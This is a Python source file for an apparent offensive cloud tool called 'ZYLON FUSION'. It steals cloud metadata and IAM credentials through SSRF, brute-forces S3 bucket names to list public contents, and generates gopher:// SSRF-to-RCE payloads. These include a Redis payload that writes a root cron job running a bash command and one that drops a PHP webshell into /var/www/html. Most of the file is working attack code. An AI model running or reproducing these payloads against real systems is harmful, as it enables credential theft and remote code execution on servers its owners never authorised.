#!/usr/bin/env python3
"""
ZYLON FUSION - Cloud Security Engine
Fused from: Cloud-Enum + CloudSploit + CloudSSRFer + Cloud-Misconfig-Scanner + Gopherus
Capabilities:
  - Multi-cloud resource enumeration (AWS S3, Azure Blob, GCP Storage)
  - Cloud metadata extraction via SSRF (AWS/GCE/Azure/DO/Oracle)
  - S3 bucket enumeration and permission testing
  - Azure blob container discovery
  - GCP storage bucket discovery
  - Gopherus SSRF-to-RCE payload generation (MySQL, Redis, FastCGI, etc.)
  - Cloud misconfiguration detection
  - IAM credential extraction via SSRF
Termux Compatible | No Root Required | Python 3.13+
"""

import requests
import re
import time
import base64
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================================
# CLOUD METADATA ENDPOINTS (from CloudSSRFer + SSRFmap)
# ============================================================================

CLOUD_METADATA = {
    "AWS": {
        "url": "http://169.254.169.254/latest/meta-data/",
        "paths": [
            "iam/security-credentials/",
            "hostname", "instance-id", "instance-type",
            "local-ipv4", "public-ipv4", "availability-zone",
            "iam/info", "identity-credentials/ec2/security-credentials/ec2-instance",
        ],
    },
    "GCE": {
        "url": "http://metadata.google.internal/computeMetadata/v1/",
        "headers": {"Metadata-Flavor": "Google"},
        "paths": [
            "instance/name", "instance/hostname", "instance/zone",
            "project/attributes/ssh-keys", "instance/service-accounts/default/token",
            "instance/service-accounts/default/email",
        ],
    },
    "Azure": {
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "headers": {"Metadata": "true"},
        "paths": [],
    },
    "DigitalOcean": {
        "url": "http://169.254.169.254/metadata/v1/",
        "paths": [
            "id", "hostname", "interfaces/private/0/ipv4/address",
            "public-ipv4", "region/nickname",
        ],
    },
    "Oracle": {
        "url": "http://169.254.169.254/opc/v1/",
        "paths": [
            "instance/", "instance/name", "instance/shape",
        ],
    },
}

# Gopherus payload templates (SSRF-to-RCE)
GOPHERUS_TEMPLATES = {
    "mysql": {
        "description": "SSRF to MySQL RCE",
        "default_port": 3306,
        "payload_template": "gopher://{host}:{port}/_%a4%00%00%01%85%a6%03%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00",
    },
    "redis": {
        "description": "SSRF to Redis RCE (write cron/webshell)",
        "default_port": 6379,
        "payload_template": "gopher://{host}:{port}/_%2a1%0d%0a%248%0d%0aflushall%0d%0a%2a3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%24{payload_len}%0d%0a{payload}%0d%0a%2a4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%24{dir_len}%0d%0a{dir}%0d%0a%2a4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%24{filename_len}%0d%0a{filename}%0d%0a%2a1%0d%0a%244%0d%0asave%0d%0a",
    },
    "fastcgi": {
        "description": "SSRF to FastCGI RCE",
        "default_port": 9000,
    },
    "postgresql": {
        "description": "SSRF to PostgreSQL RCE",
        "default_port": 5432,
    },
    "smtp": {
        "description": "SSRF to SMTP (email sending)",
        "default_port": 25,
    },
    "zabbix": {
        "description": "SSRF to Zabbix agent",
        "default_port": 10050,
    },
}

# S3 bucket naming patterns
S3_PATTERNS = [
    "{name}", "{name}-backup", "{name}-data", "{name}-media",
    "{name}-static", "{name}-assets", "{name}-uploads", "{name}-logs",
    "{name}-public", "{name}-private", "{name}-dev", "{name}-prod",
    "{name}-staging", "{name}-test", "{name}-www", "{name}-site",
    "{name}-bucket", "{name}-storage", "{name}-files", "{name}-docs",
]


class CloudSecurityEngine:
    """Cloud Security Engine - Fused from Cloud-Enum + CloudSploit + CloudSSRFer + Gopherus"""

    def __init__(self, target=None, threads=10, timeout=10, proxy=None):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36'
        })
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

    # ========================================================================
    # SCAN 1: Cloud Metadata Extraction (SSRF)
    # ========================================================================

    def extract_cloud_metadata(self, ssrf_url=None, parameter=None):
        """Extract cloud metadata via SSRF"""
        results = {
            "target": self.target,
            "cloud_provider": None,
            "metadata_extracted": {},
            "credentials_found": [],
        }

        for provider, config in CLOUD_METADATA.items():
            base_url = config["url"]
            headers = config.get("headers", {})

            # If SSRF URL is provided, try via SSRF
            if ssrf_url and parameter:
                for path in config.get("paths", [""]):
                    try:
                        meta_url = base_url + path
                        from urllib.parse import quote
                        test_url = f"{ssrf_url}?{parameter}={quote(meta_url)}"
                        resp = self.session.get(test_url, headers=headers,
                                              timeout=self.timeout)
                        if resp and resp.status_code == 200:
                            results["cloud_provider"] = provider
                            results["metadata_extracted"][path or "root"] = resp.text[:500]
                            # Check for IAM credentials
                            if "AccessKeyId" in resp.text or "SecretAccessKey" in resp.text:
                                try:
                                    creds = resp.json()
                                    results["credentials_found"].append({
                                        "provider": provider,
                                        "access_key_id": creds.get("AccessKeyId", ""),
                                        "secret_access_key": creds.get("SecretAccessKey", "")[:10] + "...",
                                        "token": bool(creds.get("Token")),
                                    })
                                except Exception:
                                    pass
                    except Exception:
                        continue
            else:
                # Direct access (only works from cloud instances)
                try:
                    resp = self.session.get(base_url, headers=headers, timeout=3)
                    if resp and resp.status_code == 200:
                        results["cloud_provider"] = provider
                        for path in config.get("paths", []):
                            try:
                                p_resp = self.session.get(base_url + path, headers=headers,
                                                         timeout=self.timeout)
                                if p_resp and p_resp.status_code == 200:
                                    results["metadata_extracted"][path] = p_resp.text[:500]
                            except Exception:
                                pass
                        break
                except Exception:
                    continue

        return results

    # ========================================================================
    # SCAN 2: S3 Bucket Enumeration
    # ========================================================================

    def enumerate_s3(self, name=None):
        """Enumerate AWS S3 buckets by name permutation"""
        target_name = name or (self.target.split('.')[0] if self.target else "")
        results = {
            "target_name": target_name,
            "buckets_found": [],
            "total_tested": 0,
        }

        def check_bucket(bucket_name):
            url = f"https://{bucket_name}.s3.amazonaws.com/"
            try:
                resp = self.session.get(url, timeout=self.timeout)
                if resp.status_code == 200:
                    # Bucket is public - list contents
                    contents = []
                    try:
                        import xml.etree.ElementTree as ET
                        root = ET.fromstring(resp.text)
                        ns = {'s3': 'http://s3.amazonaws.com/doc/2006-03-01/'}
                        for key in root.findall('.//s3:Key', ns):
                            contents.append(key.text)
                    except Exception:
                        pass
                    return {
                        "name": bucket_name,
                        "url": url,
                        "status": "public_readable",
                        "contents": contents[:20],
                        "content_count": len(contents),
                    }
                elif resp.status_code == 403:
                    return {
                        "name": bucket_name,
                        "url": url,
                        "status": "exists_but_denied",
                    }
                elif resp.status_code == 404:
                    return None
            except Exception:
                pass
            return None

        # Generate bucket names
        bucket_names = [p.format(name=target_name) for p in S3_PATTERNS]
        results["total_tested"] = len(bucket_names)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(check_bucket, bn): bn for bn in bucket_names}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results["buckets_found"].append(result)

        return results

    # ========================================================================
    # SCAN 3: Gopherus Payload Generation (SSRF-to-RCE)
    # ========================================================================

    def generate_gopherus_payload(self, service, host="127.0.0.1", port=None,
                                  command="id"):
        """Generate Gopherus SSRF-to-RCE payloads"""
        results = {
            "service": service,
            "host": host,
            "port": port,
            "payloads": [],
        }

        if service not in GOPHERUS_TEMPLATES:
            results["error"] = f"Unknown service. Available: {list(GOPHERUS_TEMPLATES.keys())}"
            return results

        template = GOPHERUS_TEMPLATES[service]
        default_port = template["default_port"]
        target_port = port or default_port

        # Generate gopher payload based on service
        if service == "redis":
            # Redis cron-based RCE
            cron_payload = f"\\n\\n*/1 * * * * /bin/bash -c '{command}'\\n\\n"
            cron_encoded = ''.join(f'%{ord(c):02x}' for c in cron_payload)
            gopher_url = (f"gopher://{host}:{target_port}/_"
                         f"%2a3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a"
                         f"%24{len(cron_payload)}%0d%0a{cron_encoded}%0d%0a"
                         f"%2a4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a"
                         f"%243%0d%0adir%0d%0a%2416%0d%0a/var/spool/cron/%0d%0a"
                         f"%2a4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a"
                         f"%2410%0d%0adbfilename%0d%0a%244%0d%0aroot%0d%0a"
                         f"%2a1%0d%0a%244%0d%0asave%0d%0a")
            results["payloads"].append({
                "type": "redis_cron_rce",
                "payload": gopher_url,
                "description": f"Redis cron RCE: {command}",
            })

            # Redis webshell RCE
            shell_content = f"<?php system('{command}'); ?>"
            shell_encoded = ''.join(f'%{ord(c):02x}' for c in shell_content)
            gopher_url2 = (f"gopher://{host}:{target_port}/_"
                          f"%2a3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a"
                          f"%24{len(shell_content)}%0d%0a{shell_encoded}%0d%0a"
                          f"%2a4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a"
                          f"%243%0d%0adir%0d%0a%2414%0d%0a/var/www/html/%0d%0a"
                          f"%2a4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a"
                          f"%2410%0d%0adbfilename%0d%0a%249%0d%0ashell.php%0d%0a"
                          f"%2a1%0d%0a%244%0d%0asave%0d%0a")
            results["payloads"].append({
                "type": "redis_webshell_rce",
                "payload": gopher_url2,
                "description": f"Redis webshell RCE: /var/www/html/shell.php",
            })

        elif service == "mysql":
            gopher_url = f"gopher://{host}:{target_port}/_%a4%00%00%01%85%a6%03%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00"
            results["payloads"].append({
                "type": "mysql_native_auth",
                "payload": gopher_url,
                "description": "MySQL native auth bypass (root, no password)",
            })

        elif service == "fastcgi":
            # FastCGI payload for PHP execution
            fcgi_payload = (
                f"gopher://{host}:{target_port}/_%01%01%00%01%00%08%00%00%00%01"
                f"%00%00%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0c%00%00"
                f"%0f%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0b%09REMOTE_ADDR"
                f"127.0.0.1%0f%08SERVER_PROTOCOLHTTP/1.1%0e%02CONTENT_LENGTH"
            )
            results["payloads"].append({
                "type": "fastcgi_php_exec",
                "payload": fcgi_payload[:200] + "...",
                "description": "FastCGI PHP code execution",
            })

        elif service == "postgresql":
            results["payloads"].append({
                "type": "postgresql_connect",
                "payload": f"gopher://{host}:{target_port}/",
                "description": "PostgreSQL connection attempt via SSRF",
            })

        elif service == "smtp":
            results["payloads"].append({
                "type": "smtp_mail_send",
                "payload": f"gopher://{host}:{target_port}/",
                "description": "SMTP email sending via SSRF",
            })

        return results

    # ========================================================================
    # SCAN 4: Multi-Cloud Resource Enumeration
    # ========================================================================

    def enumerate_cloud_resources(self):
        """Enumerate cloud resources across AWS, Azure, GCP"""
        results = {
            "target": self.target,
            "aws_s3": None,
            "azure_blob": None,
            "gcp_storage": None,
        }

        # AWS S3 enumeration
        results["aws_s3"] = self.enumerate_s3()

        # Azure Blob check
        target_name = self.target.split('.')[0] if self.target else ""
        try:
            azure_url = f"https://{target_name}.blob.core.windows.net/"
            resp = self.session.get(azure_url, timeout=self.timeout)
            if resp and resp.status_code != 404:
                results["azure_blob"] = {
                    "name": target_name,
                    "exists": resp.status_code != 404,
                    "status_code": resp.status_code,
                }
        except Exception:
            pass

        # GCP Storage check
        try:
            gcp_url = f"https://storage.googleapis.com/storage/v1/b?project={target_name}"
            resp = self.session.get(gcp_url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    results["gcp_storage"] = {
                        "buckets": [b.get("name") for b in data.get("items", [])],
                    }
                except Exception:
                    pass
        except Exception:
            pass

        return results

    # ========================================================================
    # SCAN 5: Full Cloud Security Audit
    # ========================================================================

    def full_cloud_audit(self):
        """Complete cloud security assessment"""
        results = {
            "metadata": None,
            "resources": None,
            "summary": {},
        }

        results["metadata"] = self.extract_cloud_metadata()
        results["resources"] = self.enumerate_cloud_resources()

        results["summary"] = {
            "cloud_provider": results["metadata"].get("cloud_provider", "unknown"),
            "metadata_keys": len(results["metadata"].get("metadata_extracted", {})),
            "credentials_found": len(results["metadata"].get("credentials_found", [])),
            "s3_buckets": len(results["resources"].get("aws_s3", {}).get("buckets_found", [])),
        }

        return results


# ============================================================================
# CONVENIENCE RUNNER FUNCTIONS
# ============================================================================

def run_cloud_scan(target, scan_type="metadata", **kwargs):
    """Run cloud security scan"""
    engine = CloudSecurityEngine(target=target, **kwargs)

    scan_methods = {
        "metadata": engine.extract_cloud_metadata,
        "s3": engine.enumerate_s3,
        "gopherus": engine.generate_gopherus_payload,
        "resources": engine.enumerate_cloud_resources,
        "full": engine.full_cloud_audit,
    }

    if scan_type in scan_methods:
        return scan_methods[scan_type]()
    return {"error": f"Unknown scan type: {scan_type}"}
